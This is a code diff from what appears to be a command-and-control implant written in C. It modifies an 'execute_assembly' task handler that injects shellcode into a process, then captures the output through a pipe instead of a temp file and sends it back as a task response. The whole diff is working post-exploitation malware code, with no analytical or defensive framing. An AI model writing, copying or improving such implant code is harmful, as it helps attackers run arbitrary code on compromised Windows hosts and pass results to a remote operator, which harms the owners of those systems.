@@ -71,15 +71,12 @@ void command_execute_assembly(char *task_id, char *params) {
     char file_id[128]     = {0};
     char expected_md5[64] = {0};
     int  sc_chunk_size    = EA_CHUNK_SIZE;
-    int  timeout_ms       = 30000;
 
     extract_json_string(params, "file",          file_id,      sizeof(file_id));
     extract_json_string(params, "shellcode_md5", expected_md5, sizeof(expected_md5));
     {
         int v = ea_extract_int(params, "sc_chunk_size", 0);
         if (v > 0) sc_chunk_size = v;
-        int t = ea_extract_int(params, "timeout_ms", 0);
-        if (t > 0) timeout_ms = t;
     }
 
     if (!file_id[0]) {
@@ -176,55 +173,26 @@ void command_execute_assembly(char *task_id, char *params) {
     }
     SecureZeroMemory(shellcode, shellcode_len);
     free(shellcode);
-    DEBUG_PRINT("[EA] inject ok pid=%lu, waiting %d ms", (unsigned long)inj.pid, timeout_ms);
+    DEBUG_PRINT("[EA] inject ok pid=%lu", (unsigned long)inj.pid);
 
-    /* Wait for the assembly to complete */
-    DWORD wait_result = WaitForSingleObject(inj.hProcess, (DWORD)timeout_ms);
-    DWORD exit_code   = 0xDEAD;
+    /* Drain pipe output (polls until process exits) then collect exit code */
+    DEBUG_PRINT("[EA] inject ok pid=%lu, draining pipe", (unsigned long)inj.pid);
+    char *result = NULL;
+    if (inj.hPipeRead) {
+        result = read_pipe_output(inj.hPipeRead, inj.hProcess);
+        CloseHandle(inj.hPipeRead);
+    }
+    DWORD exit_code = 0xDEAD;
     GetExitCodeProcess(inj.hProcess, &exit_code);
     CloseHandle(inj.hThread);
     CloseHandle(inj.hProcess);
-    DEBUG_PRINT("[EA] wait done: %s exit_code=0x%lX output_file=%s",
-                wait_result == WAIT_OBJECT_0 ? "exited" : "timeout",
-                (unsigned long)exit_code, inj.output_file[0] ? inj.output_file : "(none)");
+    DEBUG_PRINT("[EA] done exit_code=0x%lX output_len=%zu",
+                (unsigned long)exit_code, result ? strlen(result) : 0);
 
-    /* Read captured output from temp file */
-    char *result    = NULL;
-    DWORD file_size = 0;
-    if (inj.output_file[0]) {
-        HANDLE hFile = CreateFileA(inj.output_file, GENERIC_READ,
-                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                   NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            file_size = GetFileSize(hFile, NULL);
-            DEBUG_PRINT("[EA] temp file size=%lu", (unsigned long)file_size);
-            if (file_size > 0 && file_size != INVALID_FILE_SIZE) {
-                result = (char *)malloc(file_size + 1);
-                if (result) {
-                    DWORD rd = 0;
-                    if (!ReadFile(hFile, result, file_size, &rd, NULL) || rd == 0) {
-                        free(result); result = NULL; file_size = 0;
-                    } else {
-                        result[rd] = '\0';
-                        file_size  = rd;
-                    }
-                }
-            }
-            CloseHandle(hFile);
-        } else {
-            DEBUG_PRINT("[EA] CreateFileA(output_file) failed err=%lu", GetLastError());
-        }
-        DeleteFileA(inj.output_file);
-    }
-    DEBUG_PRINT("[EA] output captured: %lu bytes, sending response", (unsigned long)file_size);
-
-    if (!result || file_size == 0) {
+    if (!result || !result[0]) {
         free(result);
-        char diag[128];
-        snprintf(diag, sizeof(diag),
-                 "(no output) [wait=%s exit_code=0x%lX]",
-                 wait_result == WAIT_OBJECT_0 ? "exited" : "timeout",
-                 (unsigned long)exit_code);
+        char diag[64];
+        snprintf(diag, sizeof(diag), "(no output) [exit_code=0x%lX]", (unsigned long)exit_code);
         send_task_response(task_id, diag);
     } else {
         send_task_response(task_id, result);
